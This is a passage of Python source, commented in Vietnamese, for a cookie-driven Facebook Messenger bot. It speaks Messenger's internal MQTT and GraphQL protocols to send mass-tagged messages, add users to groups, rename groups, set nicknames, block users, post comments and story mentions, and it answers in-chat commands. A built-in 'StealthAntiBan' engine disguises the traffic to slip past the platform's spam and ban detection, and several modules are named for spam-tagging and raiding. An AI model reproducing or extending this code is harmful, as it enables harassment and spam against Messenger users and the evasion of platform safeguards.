        for wbits in (zlib.MAX_WBITS, -zlib.MAX_WBITS, 16 + zlib.MAX_WBITS):
            try:
                dec = zlib.decompress(b, wbits).decode("utf-8", errors="ignore").strip()
                idx_b = dec.find("{")
                if idx_b != -1:
                    return dec[idx_b:]
            except Exception:
                pass
        s = b.decode("utf-8", errors="ignore").strip()
        idx_b = s.find("{")
        return s[idx_b:] if idx_b != -1 else ""

    def _on_mqtt_message(self, client, userdata, msg):
        try:
            payload_str = self._decode_mqtt_payload_str(msg.payload)
            if not payload_str or not payload_str.startswith("{"):
                return
            parsed = json.loads(payload_str)
            if msg.topic in ("/ls_resp", "/messaging_events", "/mercury"):
                # Bắt trực tiếp lệnh từ luồng Lightspeed /ls_resp (insertNewMessage / addMessage)
                pl_inner = parsed.get("payload")
                if isinstance(pl_inner, str) and pl_inner.strip().startswith("{"):
                    # Giải mã các lệnh .menu, .help, .n, .g, .t, .ta... nằm trong Lightspeed step
                    for m_ls in re.finditer(r'"(?:insertNewMessage|sendMessage|addMessage)"\s*,\s*"([^"]{1,160})"', pl_inner):
                        cand_txt = m_ls.group(1).strip()
                        if is_direct_user_command_text(cand_txt):
                            tids_m = re.findall(r'\b(\d{10,22})\b', pl_inner)
                            tid_ls = next((x for x in tids_m if x != str(self.uid)), str(self.uid))
                            ev_ls = {
                                "thread_id": tid_ls,
                                "is_group": True,
                                "id": f"ls_{int(time.time()*1000)}_{ hash(cand_txt) & 0xFFFF }",
                                "content": cand_txt,
                                "sender_id": str(self.uid),
                                "mentions": [],
                            }
                            self.incoming_mqtt_msgs.append(ev_ls)
                            for cb in list(self.mqtt_event_callbacks):
                                try:
                                    cb(ev_ls)
                                except Exception:
                                    pass
            if msg.topic == "/t_ms":
                if "firstDeltaSeqId" in parsed and "syncToken" in parsed:
                    self.last_seq_id = str(parsed["firstDeltaSeqId"])
                    self.sync_token = str(parsed["syncToken"])
                if "lastIssuedSeqId" in parsed:
                    self.last_seq_id = str(parsed["lastIssuedSeqId"])

                for delta in (parsed.get("deltas") or []):
                    if not isinstance(delta, dict):
                        continue
                    meta = delta.get("messageMetadata") or {}
                    body_txt = delta.get("body")
                    if body_txt is None and delta.get("class") != "NewMessage":
                        continue
                    body_s = str(body_txt or "").strip()
                    if not body_s:
                        continue
                    tk = meta.get("threadKey") or {}
                    tid = str(tk.get("threadFbId") or tk.get("otherUserFbId") or "").strip()
                    is_grp = bool(tk.get("threadFbId"))
                    if tid:
                        self._THREAD_TYPE_MAP[tid] = is_grp
                    sender_id = str(meta.get("actorFbId") or self.uid).strip()
                    mid = str(meta.get("messageId") or meta.get("offlineThreadingId") or "")

                    # Trích xuất danh sách @Tag từ trường prng của Messenger MQTT Delta
                    raw_mentions = []
                    try:
                        prng_raw = (delta.get("data") or {}).get("prng")
                        if prng_raw:
                            prng_list = json.loads(prng_raw) if isinstance(prng_raw, str) else prng_raw
                            if isinstance(prng_list, list):
                                for pm in prng_list:
                                    if isinstance(pm, dict) and pm.get("i"):
                                        p_uid = str(pm["i"])
                                        p_off = int(pm.get("o", 0))
                                        p_len = int(pm.get("l", 0))
                                        p_name = GLOBAL_USER_NAME_CACHE.get(p_uid, "")
                                        if not p_name and p_len > 0 and p_off + p_len <= len(body_s):
                                            p_name = body_s[p_off:p_off + p_len].lstrip("@").strip()
                                        raw_mentions.append({
                                            "uid": p_uid,
                                            "id": p_uid,
                                            "name": p_name or f"User_{p_uid[-4:]}",
                                            "pos": p_off,
                                            "len": p_len,
                                        })
                    except Exception:
                        pass

                    ev_item = {
                        "thread_id": tid,
                        "is_group": is_grp,
                        "id": mid,
                        "content": body_s,
                        "sender_id": sender_id,
                        "mentions": raw_mentions,
                    }
                    self.incoming_mqtt_msgs.append(ev_item)
                    for cb in list(self.mqtt_event_callbacks):
                        try:
                            cb(ev_item)
                        except Exception:
                            pass
        except Exception:
            pass

    def ensure_mqtt_connected(self):
        with self.mqtt_lock:
            if self.mqtt_connected and self.mqtt_client is not None:
                return True

            if not self.last_seq_id:
                try:
                    self.get_threads(use_cache=True)
                except Exception:
                    pass
                if not self.last_seq_id:
                    self.last_seq_id = "1"

            session_id = MessengerStealthAntiBanEngine.generate_session_id()
            client_id = MessengerStealthAntiBanEngine.generate_client_id()
            user_cfg = {
                "a": self.user_agent,
                "u": str(self.uid),
                "s": session_id,
                "chat_on": True,
                "fg": False,
                "d": client_id,
                "ct": "websocket",
                "aid": "219994525426954",
                "mqtt_sid": "",
                "cp": 3,
                "ecp": 10,
                "st": [],
                "pm": [],
                "dc": "",
                "no_auto_fg": True,
                "gas": None,
                "pack": [],
            }
            ws_path = f"/chat?sid={session_id}&cid={client_id}"
            username_json = MessengerStealthAntiBanEngine.json_minimal(user_cfg)

            try:
                if self.mqtt_client:
                    try:
                        self.mqtt_client.disconnect()
                    except Exception:
                        pass
                ws_mqtt = NativeWebSocketMQTTv31Client(
                    cookie_str=self.cookie_str,
                    user_agent=self.user_agent,
                    username_json=username_json,
                    on_connect_cb=self._on_mqtt_connect,
                    on_message_cb=self._on_mqtt_message,
                    on_disconnect_cb=self._on_mqtt_disconnect,
                )
                if ws_mqtt.connect(ws_path=ws_path, host="edge-chat.facebook.com", port=443, keepalive=12):
                    self.mqtt_client = ws_mqtt
                    self.mqtt_connected = True
                    return True
            except Exception:
                self.mqtt_connected = False
            return False

    def attach_mentions_real_messenger(self, core_msg, mentions=None, tag_all=False, thread_id=None):
        final = core_msg if core_msg else ""
        mention_objs = []

        if tag_all:
            tag_token = "@everyone"
            idx_ex = final.find(tag_token)
            if idx_ex == -1:
                sep = " " if (final and not final.endswith((" ", "\n"))) else ""
                idx_ex = len(final + sep)
                final = final + sep + tag_token
            mention_objs.append({
                "id": str(thread_id or self.uid),
                "tag": tag_token,
                "offset": idx_ex,
                "length": len(tag_token),
                "type": "t",
            })

        if mentions:
            seen_u = set()
            for m in mentions:
                if not isinstance(m, dict):
                    continue
                uid = str(m.get("uid") or m.get("id") or "").strip()
                if not uid or uid in ("0", "-1") or uid in seen_u:
                    continue
                seen_u.add(uid)
                raw_name = str(m.get("name") or GLOBAL_USER_NAME_CACHE.get(uid) or f"User_{uid[-4:]}").strip().lstrip("@")
                tag_token = f"@{raw_name}"
                idx_pos = final.find(tag_token)
                if idx_pos == -1:
                    sep = " " if (final and not final.endswith((" ", "\n"))) else ""
                    idx_pos = len(final + sep)
                    final = final + sep + tag_token
                mention_objs.append({
                    "id": uid,
                    "tag": tag_token,
                    "offset": idx_pos,
                    "length": len(tag_token),
                    "type": "p",
                })

        return final, mention_objs

    def send_message_mqtt(self, thread_id, final_msg, mention_objs=None, reply_msg_id=None):
        """Gửi tin nhắn & Tag tên thật qua MQTT /ls_req chuẩn 100% từ ckien.zip/module/nhaytagmqtt.py & fb.py."""
        if not self.ensure_mqtt_connected():
            raise Exception("MQTTNotConnected")

        tid_s = str(thread_id).strip()
        tid_val = int(tid_s) if tid_s.isdigit() else tid_s
        otid = MessengerStealthAntiBanEngine.generate_offline_threading_id()
        register_system_sent_message(msg_id=otid, client_id=otid, text=final_msg)

        with self.mqtt_lock:
            self.ws_req_number += 1
            self.ws_task_number += 1
            req_id = self.ws_req_number
            t_id_1 = self.ws_task_number
            self.ws_task_number += 1
            t_id_2 = self.ws_task_number

        task_payload = {
            "initiating_source": 0,
            "multitab_env": 0,
            "otid": otid,
            "send_type": 1,
            "skip_url_preview_gen": 0,
            "source": 0,
            "sync_group": 1,
            "text": str(final_msg),
            "text_has_links": 0,
            "thread_id": tid_val,
        }

        if reply_msg_id:
            task_payload["reply_metadata"] = {
                "reply_source_id": str(reply_msg_id),
                "reply_source_type": 1,
                "reply_type": 0,
            }

        if mention_objs and final_msg:
            valid_m = get_valid_mentions_ckien(final_msg, mention_objs)
            if valid_m:
                task_payload["mention_data"] = {
                    "mention_ids": ",".join(str(x["i"]) for x in valid_m),
                    "mention_lengths": ",".join(str(x["l"]) for x in valid_m),
                    "mention_offsets": ",".join(str(x["o"]) for x in valid_m),
                    "mention_types": ",".join(str(x.get("t", "p")) for x in valid_m),
                }

        task_send = {
            "failure_count": None,
            "label": "46",
            "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
            "queue_name": tid_s,
            "task_id": t_id_1,
        }

        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "data_trace_id": None,
                "epoch_id": int(MessengerStealthAntiBanEngine.generate_offline_threading_id()),
                "tasks": [task_send],
                "version_id": "7545284305482586",
            }),
            "request_id": req_id,
            "type": 3,
        }

        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return True

    def send_typing_mqtt(self, thread_id, is_typing=True, is_group=True):
        """Gửi hiệu ứng Đang soạn tin nhắn (Typing Indicator) qua MQTT /ls_req (từ ckien.zip/module/typingmqtt.py)."""
        if not self.ensure_mqtt_connected():
            return False
        tid_s = str(thread_id).strip()
        if tid_s in self._THREAD_TYPE_MAP:
            is_group = self._THREAD_TYPE_MAP[tid_s]
        with self.mqtt_lock:
            self.ws_req_number += 1
            req_id = self.ws_req_number

        task_payload = {
            "thread_key": int(tid_s) if tid_s.isdigit() else tid_s,
            "is_group_thread": 1 if is_group else 0,
            "is_typing": 1 if is_typing else 0,
            "attribution": 0,
        }
        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "label": "3",
                "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
                "version": "25393437286970779",
            }),
            "request_id": req_id,
            "type": 4,
        }
        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return True

    def set_theme_mqtt(self, thread_id, theme_query=None):
        """Đổi chủ đề nền (Theme) Box Messenger qua MQTT /ls_req (từ ckien.zip/module/nenMqtt.py)."""
        if not self.ensure_mqtt_connected():
            return None
        tid_s = str(thread_id).strip()
        chosen = None
        if theme_query:
            q_s = str(theme_query).strip().lower()
            if q_s not in ("random", "ngaunhien", "auto"):
                chosen = next((t for t in MESSENGER_THEMES_CATALOG if t["id"] == q_s or q_s in t["name"].lower()), None)
        if not chosen:
            chosen = random.choice(MESSENGER_THEMES_CATALOG)

        with self.mqtt_lock:
            self.ws_req_number += 1
            self.ws_task_number += 1
            req_id = self.ws_req_number
            task_id = self.ws_task_number

        task_payload = {
            "thread_key": tid_s,
            "theme_fbid": chosen["id"],
            "source": None,
            "sync_group": 1,
            "payload": None,
        }
        task = {
            "failure_count": None,
            "label": "43",
            "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
            "queue_name": "thread_theme",
            "task_id": task_id,
        }
        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "data_trace_id": None,
                "epoch_id": int(MessengerStealthAntiBanEngine.generate_offline_threading_id()),
                "tasks": [task],
                "version_id": "25095469420099952",
            }),
            "request_id": req_id,
            "type": 3,
        }
        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return chosen

    def send_poll_mqtt(self, thread_id, question_text, options_list=None):
        """Tạo bình chọn (Poll) trên Box Messenger qua MQTT /ls_req (từ ckien.zip/module/nhaypoll.py)."""
        if not self.ensure_mqtt_connected():
            return False
        tid_s = str(thread_id).strip()
        tid_val = int(tid_s) if tid_s.isdigit() else tid_s
        if not options_list or len(options_list) < 2:
            options_list = [
                f"Chuẩn VIP #{random.randint(10, 99)}",
                f"Đỉnh Cao #{random.randint(10, 99)}",
                f"Siêu Cấp #{random.randint(10, 99)}",
            ]

        with self.mqtt_lock:
            self.ws_req_number += 1
            self.ws_task_number += 1
            req_id = self.ws_req_number
            task_id = self.ws_task_number

        task_payload = {
            "question_text": str(question_text or "Bình chọn Hệ Thống"),
            "thread_key": tid_val,
            "options": [str(x) for x in options_list[:10]],
            "sync_group": 1,
        }
        task = {
            "failure_count": None,
            "label": "163",
            "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
            "queue_name": "poll_creation",
            "task_id": task_id,
        }
        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "data_trace_id": None,
                "epoch_id": int(MessengerStealthAntiBanEngine.generate_offline_threading_id()),
                "tasks": [task],
                "version_id": "7158486590867448",
            }),
            "request_id": req_id,
            "type": 3,
        }
        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return True

    def share_link_mqtt(self, thread_id, url_str, text=""):
        """Chia sẻ liên kết (Share Link) qua MQTT /ls_req (từ ckien.zip/module/treosharelinkMqtt.py)."""
        if not self.ensure_mqtt_connected():
            return False
        tid_s = str(thread_id).strip()
        with self.mqtt_lock:
            self.ws_req_number += 1
            req_id = self.ws_req_number

        task_payload = {
            "otid": MessengerStealthAntiBanEngine.generate_offline_threading_id(),
            "source": 524289,
            "sync_group": 1,
            "send_type": 6,
            "mark_thread_read": 0,
            "url": str(url_str or "https://www.facebook.com/"),
            "text": str(text or ""),
            "thread_id": tid_s,
            "initiating_source": 0,
        }
        task = {
            "label": 46,
            "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
            "queue_name": tid_s,
            "task_id": random.randint(1, 1000),
            "failure_count": None,
        }
        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "tasks": [task],
                "epoch_id": MessengerStealthAntiBanEngine.generate_offline_threading_id(),
                "version_id": "7191105584331330",
            }),
            "request_id": req_id,
            "type": 3,
        }
        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return True

    def share_contact_mqtt(self, thread_id, contact_id, text=""):
        """Chia sẻ danh thiếp (Share Contact) qua MQTT /ls_req (từ ckien.zip/module/treosharecontactMqtt.py)."""
        if not self.ensure_mqtt_connected():
            return False
        tid_s = str(thread_id).strip()
        with self.mqtt_lock:
            self.ws_req_number += 1
            req_id = self.ws_req_number

        task_payload = {
            "contact_id": str(contact_id or self.uid),
            "sync_group": 1,
            "text": str(text or ""),
            "thread_id": tid_s,
        }
        task = {
            "label": 359,
            "payload": MessengerStealthAntiBanEngine.json_minimal(task_payload),
            "queue_name": "xma_open_contact_share",
            "task_id": random.randint(1, 1000),
            "failure_count": None,
        }
        content = {
            "app_id": "2220391788200892",
            "payload": MessengerStealthAntiBanEngine.json_minimal({
                "tasks": [task],
                "epoch_id": MessengerStealthAntiBanEngine.generate_offline_threading_id(),
                "version_id": "7214102258676893",
            }),
            "request_id": req_id,
            "type": 3,
        }
        self.mqtt_client.publish(
            topic="/ls_req",
            payload=MessengerStealthAntiBanEngine.json_minimal(content),
            qos=1,
            retain=False,
        )
        return True

    def rename_group(self, thread_id, new_title):
        """Đổi tên Box Nhóm Messenger (từ ckien.zip/module/nhaynamebox.py & fb.py)."""
        tid_s = str(thread_id).strip()
        otid = MessengerStealthAntiBanEngine.generate_offline_threading_id()
        form_data = {
            "client": "mercury",
            "action_type": "ma-type:log-message",
            "author": f"fbid:{self.uid}",
            "thread_id": tid_s,
            "timestamp": int(time.time() * 1000),
            "timestamp_relative": str(int(time.time())),
            "source": "source:chat:web",
            "source_tags[0]": "source:chat",
            "offline_threading_id": otid,
            "message_id": otid,
            "threading_id": MessengerStealthAntiBanEngine.generate_offline_threading_id(),
            "thread_fbid": tid_s,
            "thread_name": str(new_title),
            "log_message_type": "log:thread-name",
            "fb_dtsg": self.fb_dtsg,
            "jazoest": self.jazoest,
            "__user": str(self.uid),
            "__a": "1",
            "__req": MessengerStealthAntiBanEngine.next_req_b36(),
            "__rev": self.client_rev,
        }
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/messaging/set_thread_name/", data=form_data, headers=hdrs, timeout=10)
        return r.status_code == 200

    def change_nickname(self, thread_id, target_uid, new_nickname):
        """Đổi biệt danh thành viên trong Box Messenger (từ ckien.zip/module/username.py)."""
        tid_s = str(thread_id).strip()
        data = {
            "nickname": str(new_nickname),
            "participant_id": str(target_uid or self.uid),
            "thread_or_other_fbid": tid_s,
            "fb_dtsg": self.fb_dtsg,
            "jazoest": self.jazoest,
        }
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/messaging/save_thread_nickname/?source=thread_settings&dpr=1", data=data, headers=hdrs, timeout=10)
        return r.status_code == 200

    def block_user(self, target_uid):
        """Chặn người dùng Facebook/Messenger qua GraphQL doc_id 6305880099497989 (Tích hợp từ 3app vip.zip/module/block.py)."""
        t_uid = str(target_uid or "").strip()
        if not t_uid:
            return False
        form = self._form_all(friendly_name="useBlockUserMutation", doc_id="6305880099497989", require_graphql=None)
        form["variables"] = json.dumps({
            "input": {
                "actor_id": str(self.uid),
                "block_Origin": "MESSENGER_THREAD",
                "client_mutation_id": str(random.randint(1, 999999)),
                "target_id": t_uid,
            }
        })
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/api/graphql/", data=form, headers=hdrs, timeout=10)
        return r.status_code == 200

    def unblock_user(self, target_uid):
        """Bỏ chặn người dùng Facebook/Messenger qua GraphQL doc_id 6009824239038988 (Tích hợp từ 3app vip.zip/module/block.py)."""
        t_uid = str(target_uid or "").strip()
        if not t_uid:
            return False
        form = self._form_all(friendly_name="ProfilePlusFBMessengerUnblockMutation", doc_id="6009824239038988", require_graphql=None)
        form["variables"] = json.dumps({
            "input": {
                "actor_id": str(self.uid),
                "client_mutation_id": str(random.randint(1, 999999)),
                "target_id": t_uid,
            }
        })
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/api/graphql/", data=form, headers=hdrs, timeout=10)
        return r.status_code == 200

    def add_user_to_group(self, thread_id, user_ids_list):
        """Thêm thành viên vào Box Nhóm Messenger qua MQTT /ls_req & Mercury (Tích hợp từ 5appbytrantu.zip/module/raid.py)."""
        tid_s = str(thread_id).strip()
        uids = [str(u).strip() for u in (user_ids_list if isinstance(user_ids_list, (list, tuple, set)) else [user_ids_list]) if str(u).strip()]
        if not uids:
            return False
        otid = MessengerStealthAntiBanEngine.generate_offline_threading_id()
        form = self._form_all()
        form.update({
            "client": "mercury",
            "action_type": "ma-type:log-message",
            "author": f"fbid:{self.uid}",
            "thread_id": tid_s,
            "thread_fbid": tid_s,
            "timestamp": int(time.time() * 1000),
            "source": "source:chat:web",
            "log_message_type": "log:subscribe",
            "offline_threading_id": otid,
            "message_id": otid,
        })
        for idx, u_id in enumerate(uids):
            form[f"log_message_data[added_participants][{idx}]"] = f"fbid:{u_id}"
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/messaging/send/", data=form, headers=hdrs, timeout=12)
        return r.status_code == 200

    def comment_group_post(self, post_id, comment_text, tag_uid="", tag_name=""):
        """Bình luận bài viết Group/Top Facebook qua GraphQL doc_id 24323081780615819 (Tích hợp từ 3app vip.zip/module/nhaytop.py)."""
        pid_s = str(post_id or "").strip()
        if not pid_s:
            return False
        feedback_id = base64.b64encode(f"feedback:{pid_s}".encode("utf-8")).decode("utf-8") if pid_s.isdigit() else pid_s
        ranges = []
        final_txt = str(comment_text or "").strip()
        if tag_uid and str(tag_uid).strip():
            t_uid = str(tag_uid).strip()
            t_lbl = str(tag_name or GLOBAL_USER_NAME_CACHE.get(t_uid) or f"User_{t_uid[-4:]}").strip().lstrip("@")
            idx_t = final_txt.find(t_lbl)
            if idx_t == -1:
                sep = " " if final_txt else ""
                idx_t = len(final_txt + sep)
                final_txt = f"{final_txt}{sep}{t_lbl}"
            ranges.append({
                "entity": {"id": t_uid},
                "length": len(t_lbl),
                "offset": idx_t,
            })
        form = self._form_all(friendly_name="useCometUFICreateCommentMutation", doc_id="24323081780615819", require_graphql=None)
        form["variables"] = json.dumps({
            "feedLocation": "GROUP",
            "feedbackSource": 0,
            "groupID": None,
            "input": {
                "client_mutation_id": str(random.randint(1, 999999)),
                "actor_id": str(self.uid),
                "attachments": [],
                "feedback_id": feedback_id,
                "formatting_style": None,
                "message": {"ranges": ranges, "text": final_txt},
                "attribution_id_v2": "",
                "is_tracking_encrypted": True,
                "tracking": [],
                "feedback_source": "OBJECT",
                "idempotence_token": f"client:{uuid.uuid4()}",
                "session_id": str(uuid.uuid4()),
            },
            "inviteShortLinkKey": None,
            "renderLocation": None,
            "scale": 1,
            "useDefaultActor": False,
            "focusCommentID": None,
        })
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/api/graphql/", data=form, headers=hdrs, timeout=12)
        return r.status_code == 200

    def post_story_mention(self, content_text, target_uid=""):
        """Đăng Story văn bản kèm réo tên (Story Mention) qua GraphQL doc_id 7490607150987409 (Tích hợp từ 3app vip.zip/module/reostr.py)."""
        form = self._form_all(friendly_name="StoriesCreateMutation", doc_id="7490607150987409", require_graphql=None)
        overlays = []
        if target_uid and str(target_uid).strip():
            overlays.append({
                "tag_sticker": {
                    "bounds": {"height": 0.1, "rotation": 0, "width": 0.3, "x": 0.35, "y": 0.45},
                    "tag_id": str(target_uid).strip(),
                    "type": "PEOPLE",
                }
            })
        form["variables"] = json.dumps({
            "input": {
                "actor_id": str(self.uid),
                "audiences": [{"stories": {"self": {"target_id": str(self.uid)}}}],
                "client_mutation_id": str(random.randint(1, 999999)),
                "source": "WWW",
                "text_format_metadata": {"inspirations_custom_font_id": "2334906556782613"},
                "text_format_preset_id": "401372137331149",
                "message": {"ranges": [], "text": str(content_text or "NHK VIP STORY")[:240]},
                "overlays": overlays,
                "logging": {"composer_session_id": str(uuid.uuid4())},
            }
        })
        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
        r = self.s.post("https://www.facebook.com/api/graphql/", data=form, headers=hdrs, timeout=12)
        return r.status_code == 200

    def send_message(self, thread_id, content, is_group=True, mentions=None, tag_all=False,
                     antiband=True, use_emoji=False, icon_count=0, is_heading=True, strip_line_num=False,
                     stop_ev=None, start_global_epoch=None, start_box_epoch=None, priority_bypass=False):
        """Gửi tin nhắn Messenger ưu tiên qua đường truyền Lightspeed MQTT (/ls_req) + Desktop Mercury Assurance cho lệnh ưu tiên!"""
        tid_s = str(thread_id).strip()
        if not priority_bypass and not MessengerStealthAntiBanEngine.acquire_messenger_stealth_slot(
            self.uid, tid_s, antiband=antiband, stop_ev=stop_ev,
            start_global_epoch=start_global_epoch, start_box_epoch=start_box_epoch
        ):
            return False
        if tid_s in self._THREAD_TYPE_MAP:
            is_group = self._THREAD_TYPE_MAP[tid_s]

        raw = clean_corrupted_shortcuts(content)
        if strip_line_num:
            raw = "\n".join(strip_leading_line_number(ln) for ln in raw.split("\n"))

        eff_mentions = list(mentions) if mentions else []
        eff_tag_all = bool(tag_all)

        if "@" in raw and not priority_bypass:
            stripped_txt, auto_m, auto_all = extract_trailing_tags_and_resolve(
                raw, incoming_mentions=None, messenger_client=self, messenger_thread_id=tid_s
            )
            if auto_m or auto_all:
                raw = stripped_txt if stripped_txt else raw
                if auto_all:
                    eff_tag_all = True
                for am in auto_m:
                    if not any(str(x.get("uid") or x.get("id")) == str(am["uid"]) for x in eff_mentions):
                        eff_mentions.append(am)

        msg_with_tags, mention_objs = self.attach_mentions_real_messenger(
            raw, mentions=eff_mentions, tag_all=eff_tag_all, thread_id=tid_s
        )

        if use_emoji and icon_count > 0:
            sep_ic = " " if (msg_with_tags and not msg_with_tags.endswith(" ")) else ""
            final_msg = f"{msg_with_tags}{sep_ic}{build_unique_zalo_icons(icon_count)}"
        else:
            final_msg = msg_with_tags

        if antiband:
            final_msg = MessengerStealthAntiBanEngine.append_stealth_tail(final_msg, thread_id=tid_s)

        register_system_sent_message(text=final_msg)
        register_system_sent_message(text=raw)

        mqtt_ok = False
        try:
            if self.send_message_mqtt(tid_s, final_msg, mention_objs=mention_objs):
                mqtt_ok = True
        except Exception:
            try:
                self.mqtt_connected = False
                if self.send_message_mqtt(tid_s, final_msg, mention_objs=mention_objs):
                    mqtt_ok = True
            except Exception:
                pass
        if mqtt_ok and not priority_bypass:
            return True

        # Fallback dự phòng nếu cổng WebSocket 443 bị tường lửa mạng chặn
        otid = MessengerStealthAntiBanEngine.generate_offline_threading_id()
        register_system_sent_message(msg_id=otid, client_id=otid, text=final_msg)
        data = {
            "client": "mercury",
            "action_type": "ma-type:user-generated-message",
            "body": final_msg,
            "ephemeral_ttl_mode": "0",
            "has_attachment": "false",
            "message_id": otid,
            "offline_threading_id": otid,
            "source": "source:chat:web",
            "timestamp": str(int(time.time() * 1000)),
            "__user": self.uid,
            "__a": "1",
            "__req": MessengerStealthAntiBanEngine.next_req_b36(),
            "fb_dtsg": self.fb_dtsg,
            "jazoest": self.jazoest,
            "lsd": self.lsd,
        }
        if is_group:
            data["thread_fbid"] = tid_s
        else:
            data["other_user_fbid"] = tid_s
            data["specific_to_list[0]"] = f"fbid:{tid_s}"
            data["specific_to_list[1]"] = f"fbid:{self.uid}"
        for idx, xm in enumerate(mention_objs):
            data[f"profile_xmd[{idx}][id]"] = str(xm["id"])
            data[f"profile_xmd[{idx}][offset]"] = str(xm["offset"])
            data[f"profile_xmd[{idx}][length]"] = str(xm["length"])
            data[f"profile_xmd[{idx}][type]"] = str(xm.get("type", "p"))

        hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer=f"https://www.facebook.com/messages/t/{tid_s}")
        r = self.s.post("https://www.facebook.com/messaging/send/", data=data, headers=hdrs, timeout=12)
        self._sync_rotated_cookies()
        if r.status_code == 200:
            return True
        raise Exception(f"MessengerSendStatus:{r.status_code}")

FacebookMQTTSender = MessengerClient

class MessengerRealtimeListener:
    """Bộ lắng nghe lệnh Siêu Nhạy 24/7 trên Facebook Messenger (Hybrid Lightspeed MQTT /t_ms + /ls_resp + Fast Desktop GraphQL Poller):
    - Duy trì đồng thời kết nối WebSocket MQTT v3.1 tới wss://edge-chat.facebook.com/chat VÀ bộ quét nhanh GraphQL Desktop (1.6s)
      để dù người dùng gõ .menu, .help, .n, .g, .nhaypoll, .t, .ta ở bất kỳ Box nào (như testtbot) cũng đều phản hồi trong < 0.5s!"""

    def __init__(self, acc_id):
        self.acc_id = acc_id
        self.platform = "messenger"
        self.stop_ev = threading.Event()
        self.seen_msg_ids = deque(maxlen=3500)
        self.is_initial_seed_done = False
        self.notified_pc_once = False
        self.ws_status = "Messenger Desktop PC Shield + MQTT Active"
        self.last_event_ts = 0.0
        self.thread = threading.Thread(target=self._run_loop, daemon=True)

    def start(self):
        self.thread.start()

    def stop(self):
        self.stop_ev.set()

    def _get_acc_row(self):
        return get_account_from_ram(self.acc_id)

    @staticmethod
    def _clean_messenger_snippet_cmd(raw_text):
        if not raw_text:
            return ""
        s = strip_invisible_chars(str(raw_text))
        if not s:
            return ""
        if s[0] in (".", "/", "!"):
            return s
        # Hỗ trợ cắt bỏ tiền tố 'Bạn: .menu' hoặc 'Tên: .help' trong snippet của CometChatInboxQuery
        m = re.match(r"^[^:\n]{1,45}:\s*([\./!][a-zA-Z0-9_].*)$", s)
        if m:
            return m.group(1).strip()
        return s

    def _process_incoming_item(self, client, acc_row, item):
        tid = str(item.get("thread_id") or "").strip()
        mid = str(item.get("id") or "").strip()
        cleaned_cmd = self._clean_messenger_snippet_cmd(item.get("content") or "")
        if not tid or not cleaned_cmd:
            return
        dedupe_k = f"{tid}:{mid}:{cleaned_cmd[:40]}"
        if dedupe_k in self.seen_msg_ids:
            return
        self.seen_msg_ids.append(dedupe_k)
        if is_system_echo_message(msg_id=mid, text=cleaned_cmd):
            return
        if is_direct_user_command_text(cleaned_cmd):
            self.last_event_ts = time.time()
            _PRIORITY_CMD_EXECUTOR.submit(
                parse_and_execute_inchat_command,
                None,
                acc_row,
                tid,
                bool(item.get("is_group", True)),
                item.get("sender_id") or client.uid,
                cleaned_cmd,
                item.get("mentions"),
                None,
                "messenger",
                client,
                False,
                "",
                mid,
            )

    def _run_loop(self):
        self.stop_ev.wait(0.4)
        while not self.stop_ev.is_set():
            acc_row = self._get_acc_row()
            if not acc_row or acc_row.get("platform") != "messenger":
                break
            if not acc_row.get("chat_cmd_enabled", 1):
                self.ws_status = "Đã tắt nhận lệnh"
                self.stop_ev.wait(4.0)
                continue

            try:
                client = MessengerClient.get_pooled_client(acc_row["cookies"], uid=acc_row.get("uid") or "")
                if not self.notified_pc_once:
                    self.notified_pc_once = True
                    FacebookPCDeviceGuard.notify_pc_login_to_facebook_async(client)

                def _rt_cb(ev_item):
                    if not self.stop_ev.is_set():
                        cur_acc = self._get_acc_row()
                        if cur_acc and cur_acc.get("chat_cmd_enabled", 1):
                            self._process_incoming_item(client, cur_acc, ev_item)

                client.register_incoming_callback(_rt_cb)
                mqtt_ok = client.ensure_mqtt_connected()
                self.ws_status = (
                    f"PC {getattr(client, 'pc_name', 'Desktop')[:22]} • MQTT + GraphQL (.menu Sẵn Sàng)"
                    if mqtt_ok else
                    f"PC {getattr(client, 'pc_name', 'Desktop')[:22]} • GraphQL Shield (.menu Sẵn Sàng)"
                )

                # Luôn quét nhẹ CometChatInboxQuery song song để bắt 100% lệnh (.menu, .help, .n, .g, .t, .ta)
                # ngay cả khi Facebook nén hoặc trì hoãn hàng đợi /t_ms!
                inbox_latest = []
